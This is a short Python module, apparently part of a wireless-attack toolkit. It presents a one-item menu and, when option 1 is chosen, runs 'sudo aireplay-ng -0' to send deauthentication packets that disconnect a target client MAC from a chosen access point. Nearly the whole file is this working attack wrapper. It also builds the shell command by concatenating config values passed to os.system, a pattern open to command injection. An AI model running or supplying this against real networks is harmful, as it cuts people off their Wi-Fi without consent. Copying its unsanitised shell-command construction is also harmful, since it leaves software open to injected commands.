import sys
import os
import configparser

def injectionMenu():
	print("1. Perform a Deauthentication Attack")
	
def injectionInput(config):
	injectionMenu()
	command = input("> ")
	
	#Issue a deauthentication attack
	if command == "1":
		deauth(config)
	#Return to the main menu
	else:
		return

def deauth(config):
	#Aireplay command to send deauth packets
	bssid = config['ap']['bssid']
	target_mac = config['target']['mac']
	nic = config['host']['nic']
	cmd = "sudo aireplay-ng -0 1 -a " + bssid + " -c " + target_mac + " " + nic
	os.system(cmd)	
